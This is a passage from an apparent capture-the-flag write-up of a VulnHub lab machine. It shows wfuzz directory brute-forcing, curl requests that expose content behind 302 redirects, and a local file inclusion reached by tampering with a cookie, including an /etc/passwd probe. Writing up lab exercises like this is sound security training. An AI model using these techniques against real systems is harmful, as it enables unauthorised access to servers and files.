<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>bind<span style=color:#f92672>(</span>3, <span style=color:#f92672>{</span>sa_family<span style=color:#f92672>=</span>AF_INET, sin_port<span style=color:#f92672>=</span>htons<span style=color:#f92672>(</span>666<span style=color:#f92672>)</span>, sin_addr<span style=color:#f92672>=</span>inet_addr<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;0.0.0.0&#34;</span><span style=color:#f92672>)}</span>, 16<span style=color:#f92672>)</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
listen<span style=color:#f92672>(</span>3, 10<span style=color:#f92672>)</span>                           <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
accept<span style=color:#f92672>(</span>3, 0, NULL<span style=color:#f92672>)</span>                      <span style=color:#f92672>=</span> <span style=color:#ae81ff>4</span>
read<span style=color:#f92672>(</span>4, <span style=color:#e6db74>&#34;test\r\n&#34;</span>, 2000<span style=color:#f92672>)</span>               <span style=color:#f92672>=</span> <span style=color:#ae81ff>6</span>
write<span style=color:#f92672>(</span>4, <span style=color:#e6db74>&#34;test\r\n\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&#34;</span>..., 1500<span style=color:#f92672>)</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>1500</span>
read<span style=color:#f92672>(</span>4, <span style=color:#e6db74>&#34;&#34;</span>, 2000<span style=color:#f92672>)</span>                       <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
write<span style=color:#f92672>(</span>4, <span style=color:#e6db74>&#34;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&#34;</span>..., 1500<span style=color:#f92672>)</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>1500</span>
read<span style=color:#f92672>(</span>4, <span style=color:#e6db74>&#34;&#34;</span>, 2000<span style=color:#f92672>)</span>                       <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
write<span style=color:#f92672>(</span>4, <span style=color:#e6db74>&#34;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&#34;</span>..., 1500<span style=color:#f92672>)</span> <span style=color:#f92672>=</span> -1 EPIPE <span style=color:#f92672>(</span>Broken pipe<span style=color:#f92672>)</span>
--- SIGPIPE <span style=color:#f92672>(</span>Broken pipe<span style=color:#f92672>)</span> @ <span style=color:#ae81ff>0</span> <span style=color:#f92672>(</span>0<span style=color:#f92672>)</span> ---
+++ killed by SIGPIPE +++
</code></pre></div><p>Eventually I decided to leave the echoserver alone and move on to the web server.</p>
<h2 id=the-web-server>the web server<a hidden class=anchor aria-hidden=true href=#the-web-server>#</a></h2>
<p>Web hacking is generally more familiar for me. Initially the web server did not reveal anything interesting. That is until you view the <code>robots.txt</code>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~# curl http://192.168.56.102/robots.txt
User-agent: *
Disallow: /personal/
Disallow: /super_secret_login_path_muhahaha/
</code></pre></div><p>The folder <code>personal/</code> had a g0tmi1lk (founder of VulnHub) fansite detailing that it is being built by Jack and will be live soon. Other than that, nothing particularly interesting. <code>super_secret_login_path_muhahaha</code> however, presented us with a login portal with a title <strong>Admin</strong>.</p>
<p>The login form posted to <code>login.php</code>, and on failure would 302 to: <code>http://192.168.56.102/super_secret_login_path_muhahaha/index.php?the_user_is_a_failure=1</code>. Fuzzing <code>the_user_is_a_failure</code> simply appeared to flip the Login Failed message. Manual and automated test with sqlmap also failed. Sooo, it was time to enumerate some more.</p>
<p>The next move was to fuzz more directories and maybe some interesting files. I decided on <code>wfuzz</code> for this. I used the medium wordlist for the sake of time, and tried for some folders and files in both the known and unknown directories:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~# wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/big.txt --hc <span style=color:#ae81ff>404</span> http://192.168.56.102/super_secret_login_path_muhahaha/FUZZ

********************************************************
* Wfuzz  2.0 - The Web Bruteforcer                     *
********************************************************

Target: http://192.168.56.102/super_secret_login_path_muhahaha/FUZZ
Payload type: file,/usr/share/wordlists/wfuzz/general/big.txt

Total requests: 3036
<span style=color:#f92672>==================================================================</span>
ID Response   Lines      Word         Chars          Request
<span style=color:#f92672>==================================================================</span>

00013:  C<span style=color:#f92672>=</span><span style=color:#ae81ff>200</span>      <span style=color:#ae81ff>7</span> L        <span style=color:#ae81ff>11</span> W       <span style=color:#ae81ff>88</span> Ch    <span style=color:#e6db74>&#34; - 1&#34;</span>
02780:  C<span style=color:#f92672>=</span><span style=color:#ae81ff>200</span>   <span style=color:#ae81ff>5606</span> L     <span style=color:#ae81ff>35201</span> W    <span style=color:#ae81ff>1028165</span> Ch     <span style=color:#e6db74>&#34; - server&#34;</span>
</code></pre></div><p>Adding <code>.php</code> to the end of my fuzz keyword revealed some more interesting files:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~# wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/big.txt --hc <span style=color:#ae81ff>404</span> http://192.168.56.102/super_secret_login_path_muhahaha/FUZZ.php

********************************************************
* Wfuzz  2.0 - The Web Bruteforcer                     *
********************************************************

Target: http://192.168.56.102/super_secret_login_path_muhahaha/FUZZ.php
Payload type: file,/usr/share/wordlists/wfuzz/general/big.txt

Total requests: 3036
<span style=color:#f92672>==================================================================</span>
ID Response   Lines      Word         Chars          Request
<span style=color:#f92672>==================================================================</span>

01375:  C<span style=color:#f92672>=</span><span style=color:#ae81ff>200</span>     <span style=color:#ae81ff>17</span> L        <span style=color:#ae81ff>33</span> W      <span style=color:#ae81ff>371</span> Ch    <span style=color:#e6db74>&#34; - index&#34;</span>
01663:  C<span style=color:#f92672>=</span><span style=color:#ae81ff>302</span>      <span style=color:#ae81ff>0</span> L         <span style=color:#ae81ff>0</span> W        <span style=color:#ae81ff>0</span> Ch    <span style=color:#e6db74>&#34; - login&#34;</span>
01684:  C<span style=color:#f92672>=</span><span style=color:#ae81ff>200</span>      <span style=color:#ae81ff>5</span> L        <span style=color:#ae81ff>19</span> W      <span style=color:#ae81ff>163</span> Ch    <span style=color:#e6db74>&#34; - mail&#34;</span>
02009:  C<span style=color:#f92672>=</span><span style=color:#ae81ff>302</span>     <span style=color:#ae81ff>21</span> L        <span style=color:#ae81ff>38</span> W      <span style=color:#ae81ff>566</span> Ch    <span style=color:#e6db74>&#34; - panel&#34;</span>
02076:  C<span style=color:#f92672>=</span><span style=color:#ae81ff>302</span>     <span style=color:#ae81ff>17</span> L        <span style=color:#ae81ff>35</span> W      <span style=color:#ae81ff>387</span> Ch    <span style=color:#e6db74>&#34; - personal&#34;</span>
02439:  C<span style=color:#f92672>=</span><span style=color:#ae81ff>200</span>      <span style=color:#ae81ff>7</span> L        <span style=color:#ae81ff>21</span> W      <span style=color:#ae81ff>170</span> Ch    <span style=color:#e6db74>&#34; - server&#34;</span>
02852:  C<span style=color:#f92672>=</span><span style=color:#ae81ff>200</span>      <span style=color:#ae81ff>2</span> L         <span style=color:#ae81ff>2</span> W       <span style=color:#ae81ff>19</span> Ch    <span style=color:#e6db74>&#34; - users&#34;</span>
</code></pre></div><p>So this gives us slightly more to work with. All of the above are relative to <code>super_secret_login_path_muhahaha</code>.
<code>/1</code> was a big red <strong>INTRUDER ALERT</strong> message, and <code>/server</code> was a gif of a server rack falling over.</p>
<p>From the .php file side of things, it was slightly more interesting.</p>
<h2 id=302-content-anyone>302 content anyone?<a hidden class=anchor aria-hidden=true href=#302-content-anyone>#</a></h2>
<p>I was already aware of <code>index.php</code> as well as <code>login.php</code> due to the root of the login directory revealing this. The rest of the items I browsed using the Iceweasal browser in Kali Linux. The results were:</p>
<ul>
<li><code>mail.php</code> was a page showing us that we have received <em>2</em> emails, and that the &lsquo;firewall&rsquo; is activated. There was also what I think is a spam filtering dog gif ;)</li>
<li><code>panel.php</code> simply redirected you back to <code>index.php</code>. Assuming there is a auth requirement here.</li>
<li><code>personal.php</code> also simply redirected you back to <code>index.php</code>. Again, assuming a auth requirement.</li>
<li><code>server.php</code> had the gif we saw in <code>/server</code> with some humorous test with it. Nothing really of interest.</li>
<li><code>users.php</code> just returned the words <em>Jack</em>. This is the same user mentioned in the shrine page from <code>/personal/</code>.</li>
</ul>
<p>Due to these auth requirements, I decided to take all of these url&rsquo;s to <code>curl</code>, and inspect the cookies, headers etc. that were being sent around. Maybe this will hint towards something useful. The command used for the investigations was:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~# curl -L -v http://192.168.56.102/super_secret_login_path_muhahaha/index.php -c cookies -b cookies
&lt;HTML&gt;
&lt;FORM name<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;login&#34;</span> method<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;post&#34;</span> action<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;login.php&#34;</span>&gt;
&lt;CENTER&gt;
&lt;H1&gt; Admin &lt;/H1&gt;
&lt;H3&gt;
&lt;STRONG&gt;Username:&lt;/STRONG&gt;
&lt;INPUT name<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;username&#34;</span> id<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;username&#34;</span> type<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;text&#34;</span> value<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;&#34;</span>/&gt;
&lt;BR&gt;
&lt;BR&gt;
&lt;STRONG&gt;Password:&lt;/STRONG&gt;
&lt;INPUT name<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;password&#34;</span> id<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;password&#34;</span> type<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;password&#34;</span> value<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;&#34;</span>/&gt;
&lt;BR&gt;
&lt;BR&gt;
&lt;INPUT name<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;mysubmit&#34;</span> id<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;mysubmit&#34;</span> type<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;submit&#34;</span> value<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;Login&#34;</span>/&gt;
&lt;/H3&gt;
&lt;/HTML&gt;
</code></pre></div><p>Here I am telling curl to make a <code>GET</code> request to http://192.168.56.102/super_secret_login_path_muhahaha/index.php, using a cookies file called <code>cookies</code> when making the request (-b flag), and storing any cookies received in the same file (-c flag). I am also telling it to follow redirects in the case of <code>302</code>&rsquo;s, and be verbose with output so that I can see the headers. Requesting <code>index.php</code> resulted in a cookie jar of:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~# cat cookies
<span style=color:#75715e># Netscape HTTP Cookie File</span>
<span style=color:#75715e># http://curl.haxx.se/rfc/cookie_spec.html</span>
<span style=color:#75715e># This file was generated by libcurl! Edit at your own risk.</span>

192.168.56.102 FALSE /  FALSE <span style=color:#ae81ff>0</span>  PHPSESSID   8u300rbb0747fi6iocm0lt4310
</code></pre></div><p>Great. So I used this on all of the enumerated scripts, carefully checking for anything that would stand out. This part definitely took me some time to realize, but I finally saw the gem when I made a request to <code>personal.php</code>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~# curl -v -L http://192.168.56.102/super_secret_login_path_muhahaha/personal.php -c cookies -b cookies
* About to connect<span style=color:#f92672>()</span> to 192.168.56.102 port <span style=color:#ae81ff>80</span> <span style=color:#f92672>(</span><span style=color:#75715e>#0)</span>
*   Trying 192.168.56.102...
* connected
* Connected to 192.168.56.102 <span style=color:#f92672>(</span>192.168.56.102<span style=color:#f92672>)</span> port <span style=color:#ae81ff>80</span> <span style=color:#f92672>(</span><span style=color:#75715e>#0)</span>
&gt; GET /super_secret_login_path_muhahaha/personal.php HTTP/1.1
&gt; User-Agent: curl/7.26.0
&gt; Host: 192.168.56.102
&gt; Accept: */*
&gt; Cookie: PHPSESSID<span style=color:#f92672>=</span>8u300rbb0747fi6iocm0lt4310
&gt;
* HTTP 1.1 or later with persistent connection, pipelining supported
&lt; HTTP/1.1 <span style=color:#ae81ff>302</span> Found
&lt; Date: Sun, <span style=color:#ae81ff>20</span> Jul <span style=color:#ae81ff>2014</span> 07:48:17 GMT
&lt; Server: Apache/2.2.22 <span style=color:#f92672>(</span>Debian<span style=color:#f92672>)</span>
&lt; X-Powered-By: PHP/5.4.4-14+deb7u11
&lt; Expires: Thu, <span style=color:#ae81ff>19</span> Nov <span style=color:#ae81ff>1981</span> 08:52:00 GMT
&lt; Cache-Control: no-store, no-cache, must-revalidate, post-check<span style=color:#f92672>=</span>0, pre-check<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>
&lt; Pragma: no-cache
&lt; Location: index.php
&lt; Vary: Accept-Encoding
&lt; Content-Length: <span style=color:#ae81ff>387</span>
&lt; Content-Type: text/html
&lt;
* Ignoring the response-body     <span style=color:#75715e># WAIT A SEC...</span>
* Connection <span style=color:#75715e>#0 to host 192.168.56.102 left intact</span>
* Issue another request to this URL: <span style=color:#e6db74>&#39;http://192.168.56.102/super_secret_login_path_muhahaha/index.php&#39;</span>
* Re-using existing connection! <span style=color:#f92672>(</span><span style=color:#75715e>#0) with host (nil)</span>
* Connected to <span style=color:#f92672>(</span>nil<span style=color:#f92672>)</span> <span style=color:#f92672>(</span>192.168.56.102<span style=color:#f92672>)</span> port <span style=color:#ae81ff>80</span> <span style=color:#f92672>(</span><span style=color:#75715e>#0)</span>
&gt; GET /super_secret_login_path_muhahaha/index.php HTTP/1.1
</code></pre></div><p>Look at line 25. <em>Ignoring the request-body</em>. But we got a 302? Ok lets make another request without the <code>-L</code> flag and check if it reveals anything:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~# curl -v http://192.168.56.102/super_secret_login_path_muhahaha/personal.php -c cookies -b cookies
* About to connect<span style=color:#f92672>()</span> to 192.168.56.102 port <span style=color:#ae81ff>80</span> <span style=color:#f92672>(</span><span style=color:#75715e>#0)</span>
*   Trying 192.168.56.102...
* connected
* Connected to 192.168.56.102 <span style=color:#f92672>(</span>192.168.56.102<span style=color:#f92672>)</span> port <span style=color:#ae81ff>80</span> <span style=color:#f92672>(</span><span style=color:#75715e>#0)</span>
&gt; GET /super_secret_login_path_muhahaha/personal.php HTTP/1.1
&gt; User-Agent: curl/7.26.0
&gt; Host: 192.168.56.102
&gt; Accept: */*
&gt; Cookie: PHPSESSID<span style=color:#f92672>=</span>8u300rbb0747fi6iocm0lt4310
&gt;
* HTTP 1.1 or later with persistent connection, pipelining supported
&lt; HTTP/1.1 <span style=color:#ae81ff>302</span> Found
&lt; Date: Sun, <span style=color:#ae81ff>20</span> Jul <span style=color:#ae81ff>2014</span> 07:54:07 GMT
&lt; Server: Apache/2.2.22 <span style=color:#f92672>(</span>Debian<span style=color:#f92672>)</span>
&lt; X-Powered-By: PHP/5.4.4-14+deb7u11
&lt; Expires: Thu, <span style=color:#ae81ff>19</span> Nov <span style=color:#ae81ff>1981</span> 08:52:00 GMT
&lt; Cache-Control: no-store, no-cache, must-revalidate, post-check<span style=color:#f92672>=</span>0, pre-check<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>
&lt; Pragma: no-cache
&lt; Location: index.php
&lt; Vary: Accept-Encoding
&lt; Content-Length: <span style=color:#ae81ff>387</span>
&lt; Content-Type: text/html
&lt;
&lt;HTML&gt;
&lt;FORM name<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;login&#34;</span> method<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;post&#34;</span> action<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;check.php&#34;</span>&gt;
&lt;CENTER&gt;
&lt;H1&gt; Personal Folder Login &lt;/H1&gt;
&lt;H3&gt;
&lt;STRONG&gt;Username:&lt;/STRONG&gt;
&lt;INPUT name<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;username&#34;</span> id<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;username&#34;</span> type<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;text&#34;</span> value<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;&#34;</span>/&gt;
&lt;BR&gt;
&lt;BR&gt;
&lt;STRONG&gt;Password:&lt;/STRONG&gt;
&lt;INPUT name<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;password&#34;</span> id<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;password&#34;</span> type<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;password&#34;</span> value<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;&#34;</span>/&gt;
&lt;BR&gt;
&lt;BR&gt;
&lt;INPUT name<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;mysubmit&#34;</span> id<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;mysubmit&#34;</span> type<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;submit&#34;</span> value<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;Login&#34;</span>/&gt;
&lt;/H3&gt;
&lt;/HTML&gt;

* Connection <span style=color:#75715e>#0 to host 192.168.56.102 left intact</span>
* Closing connection <span style=color:#75715e>#0</span>
</code></pre></div><p>Well what do you know. We get a 302 and content. This time we have a login form that posts to <code>check.php</code>. A <code>GET</code> request to <code>check.php</code> resulted in a 302, but to <code>personal.php</code> and not <code>index.php</code>.</p>
<p><code>panel.php</code> had similar behavior. Showing content even though we got a 302. The output for <code>panel.php</code>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>&lt;<span style=color:#f92672>HTML</span>&gt;
&lt;<span style=color:#f92672>CENTRE</span>&gt;
&lt;<span style=color:#f92672>H2</span>&gt; Folders &lt;/<span style=color:#f92672>H2</span>&gt;
&lt;<span style=color:#f92672>TABLE</span> <span style=color:#a6e22e>style</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;width:700px&#34;</span> <span style=color:#a6e22e>align</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;center&#34;</span>&gt;
&lt;<span style=color:#f92672>TR</span>&gt;
   &lt;<span style=color:#f92672>TD</span>&gt;&lt;<span style=color:#f92672>A</span> <span style=color:#a6e22e>HREF</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;server.php&#34;</span>&gt;&lt;<span style=color:#f92672>IMG</span> <span style=color:#a6e22e>SRC</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#39;folder.png&#39;</span>&gt;&lt;/<span style=color:#f92672>A</span>&gt;&lt;/<span style=color:#f92672>TD</span>&gt;
   &lt;<span style=color:#f92672>TD</span>&gt;&lt;<span style=color:#f92672>A</span> <span style=color:#a6e22e>HREF</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;mail.php&#34;</span>&gt;&lt;<span style=color:#f92672>IMG</span> <span style=color:#a6e22e>SRC</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#39;folder.png&#39;</span>&gt;&lt;/<span style=color:#f92672>A</span>&gt;&lt;/<span style=color:#f92672>TD</span>&gt;
   &lt;<span style=color:#f92672>TD</span>&gt;&lt;<span style=color:#f92672>A</span> <span style=color:#a6e22e>HREF</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;users.php&#34;</span>&gt;&lt;<span style=color:#f92672>IMG</span> <span style=color:#a6e22e>SRC</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#39;folder.png&#39;</span>&gt;&lt;/<span style=color:#f92672>A</span>&gt;&lt;/<span style=color:#f92672>TD</span>&gt;
   &lt;<span style=color:#f92672>TD</span>&gt;&lt;<span style=color:#f92672>A</span> <span style=color:#a6e22e>HREF</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;personal.php&#34;</span>&gt;&lt;<span style=color:#f92672>IMG</span> <span style=color:#a6e22e>SRC</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#39;folder.png&#39;</span>&gt;&lt;/<span style=color:#f92672>A</span>&gt;&lt;/<span style=color:#f92672>TD</span>&gt;
   &lt;<span style=color:#f92672>TD</span>&gt;&lt;<span style=color:#f92672>A</span> <span style=color:#a6e22e>HREF</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;notes.php&#34;</span>&gt;&lt;<span style=color:#f92672>IMG</span> <span style=color:#a6e22e>SRC</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#39;folder.png&#39;</span>&gt;&lt;/<span style=color:#f92672>A</span>&gt;&lt;/<span style=color:#f92672>TD</span>&gt;
&lt;/<span style=color:#f92672>TR</span>&gt;
&lt;<span style=color:#f92672>TR</span>&gt;
   &lt;<span style=color:#f92672>TD</span>&gt;&lt;<span style=color:#f92672>H4</span>&gt;Server Status&lt;/<span style=color:#f92672>H4</span>&gt;&lt;/<span style=color:#f92672>TD</span>&gt;
   &lt;<span style=color:#f92672>TD</span>&gt;&lt;<span style=color:#f92672>H4</span>&gt;Mail Status&lt;/<span style=color:#f92672>H4</span>&gt;&lt;/<span style=color:#f92672>TD</span>&gt;
   &lt;<span style=color:#f92672>TD</span>&gt;&lt;<span style=color:#f92672>H4</span>&gt;Auth Users&lt;/<span style=color:#f92672>H4</span>&gt;&lt;/<span style=color:#f92672>TD</span>&gt;
   &lt;<span style=color:#f92672>TD</span>&gt;&lt;<span style=color:#f92672>H4</span>&gt;Personal Folder&lt;/<span style=color:#f92672>H4</span>&gt;&lt;/<span style=color:#f92672>TD</span>&gt;
   &lt;<span style=color:#f92672>TD</span>&gt;&lt;<span style=color:#f92672>H4</span>&gt;Notes&lt;/<span style=color:#f92672>H4</span>&gt;&lt;/<span style=color:#f92672>TD</span>&gt;
&lt;/<span style=color:#f92672>TR</span>&gt;
&lt;/<span style=color:#f92672>CENTRE</span>&gt;
&lt;/<span style=color:#f92672>HTML</span>&gt;
</code></pre></div><p>Here we have another script, <code>notes.php</code> revealed. Browsing to <code>notes.php</code>, we are presented with a input field with a <em>Write Note</em> button, and a message stating: <em>&ldquo;note.txt stored to temporary storage upon submission&rdquo;</em>. I guessed this temporary storage is most probably /tmp. Posting to notes.php did not yield any input and I figured this was part of something to come later.</p>
<h2 id=finding-the-web-vuln>finding the web vuln<a hidden class=anchor aria-hidden=true href=#finding-the-web-vuln>#</a></h2>
<p>Ok we have come this far and you still reading? :O Just a little more and all will be revealed I promise.</p>
<p>Back to <code>check.php</code>, it was time to check for any potential SQL injection on the post to <code>check.php</code> from the login form. Nope. Nothing like that. However, while messing around I noticed that this script was setting a new cookie <code>failcount</code>. failcount would increment with every incorrect login to <code>check.php</code>. After <em>3</em> failed attempts, another cookie called <code>intruder</code> was set:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>Added cookie intruder<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;1&#34;</span> <span style=color:#66d9ef>for</span> domain 192.168.56.102, path /super_secret_login_path_muhahaha/, expire <span style=color:#ae81ff>0</span>
&gt; Cookie: intruder<span style=color:#f92672>=</span>1; failcount<span style=color:#f92672>=</span>4; PHPSESSID<span style=color:#f92672>=</span>8u300rbb0747fi6iocm0lt4310
</code></pre></div><p>Again I will admit this did not jump right out at me. In fact it took quite a few more requests to finally puzzle it together. However, I finally nailed it when a request without the -L (follow redirects) flag was set for <code>panel.php</code>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>&lt;HTML&gt;
&lt;CENTRE&gt;
&lt;H2&gt; Folders &lt;/H2&gt;
&lt;TABLE style<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;width:700px&#34;</span> align<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;center&#34;</span>&gt;
&lt;TR&gt;
   &lt;TD&gt;&lt;A HREF<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;server.php&#34;</span>&gt;&lt;IMG SRC<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
   &lt;TD&gt;&lt;A HREF<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;mail.php&#34;</span>&gt;&lt;IMG SRC<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
   &lt;TD&gt;&lt;A HREF<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;users.php&#34;</span>&gt;&lt;IMG SRC<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
   &lt;TD&gt;&lt;A HREF<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;personal.php&#34;</span>&gt;&lt;IMG SRC<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
   &lt;TD&gt;&lt;A HREF<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;notes.php&#34;</span>&gt;&lt;IMG SRC<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
&lt;/TR&gt;
&lt;TR&gt;
   &lt;TD&gt;&lt;H4&gt;Server Status&lt;/H4&gt;&lt;/TD&gt;
   &lt;TD&gt;&lt;H4&gt;Mail Status&lt;/H4&gt;&lt;/TD&gt;
   &lt;TD&gt;&lt;H4&gt;Auth Users&lt;/H4&gt;&lt;/TD&gt;
   &lt;TD&gt;&lt;H4&gt;Personal Folder&lt;/H4&gt;&lt;/TD&gt;
   &lt;TD&gt;&lt;H4&gt;Notes&lt;/H4&gt;&lt;/TD&gt;
&lt;/TR&gt;
&lt;/CENTRE&gt;
&lt;HTML&gt;
&lt;CENTER&gt;
&lt;FONT COLOR <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;RED&#34;</span>&gt;
&lt;H1&gt;INTRUDER ALERT!&lt;/H1&gt;
&lt;/FONT&gt;
&lt;/CENTER&gt;
&lt;/HTML&gt;
&lt;/HTML&gt;
</code></pre></div><p>Notice the familiar <strong>INTRUDER ALERT</strong> message? :) Also remember how this file was called <code>/1</code> from the previous enumeration? Yep! File Include time! With us having a cookiejar file called <code>cookies</code> available for editing, it was easy to play around with this. The normal cookiejar had:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~# cat cookies
<span style=color:#75715e># Netscape HTTP Cookie File</span>
<span style=color:#75715e># http://curl.haxx.se/rfc/cookie_spec.html</span>
<span style=color:#75715e># This file was generated by libcurl! Edit at your own risk.</span>

192.168.56.102 FALSE /  FALSE <span style=color:#ae81ff>0</span>  PHPSESSID   8u300rbb0747fi6iocm0lt4310
192.168.56.102 FALSE /super_secret_login_path_muhahaha/  FALSE <span style=color:#ae81ff>0</span>  failcount   <span style=color:#ae81ff>4</span>
192.168.56.102 FALSE /super_secret_login_path_muhahaha/  FALSE <span style=color:#ae81ff>0</span>  intruder <span style=color:#ae81ff>1</span>
</code></pre></div><p>To test the file include, the first knee jerk reaction was to replace the <code>1</code> with <code>/etc/passwd</code>. This yielded no results, and immediately I feared failure and assumptions disappointing me. However, just to make sure, I replaced it again with something in the same path as <code>/1</code>, like <code>mail.php</code>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~# cat cookies
<span style=color:#75715e># Netscape HTTP Cookie File</span>
<span style=color:#75715e># http://curl.haxx.se/rfc/cookie_spec.html</span>
<span style=color:#75715e># This file was generated by libcurl! Edit at your own risk.</span>

192.168.56.102 FALSE /  FALSE <span style=color:#ae81ff>0</span>  PHPSESSID   8u300rbb0747fi6iocm0lt4310
192.168.56.102 FALSE /super_secret_login_path_muhahaha/  FALSE <span style=color:#ae81ff>0</span>  failcount   <span style=color:#ae81ff>4</span>
192.168.56.102 FALSE /super_secret_login_path_muhahaha/  FALSE <span style=color:#ae81ff>0</span>  intruder ./mail.php

root@kali:~# curl http://192.168.56.102/super_secret_login_path_muhahaha/panel.php -c cookies -b cookies

&lt;HTML&gt;
&lt;CENTRE&gt;
&lt;H2&gt; Folders &lt;/H2&gt;
&lt;TABLE style<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;width:700px&#34;</span> align<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;center&#34;</span>&gt;
&lt;TR&gt;
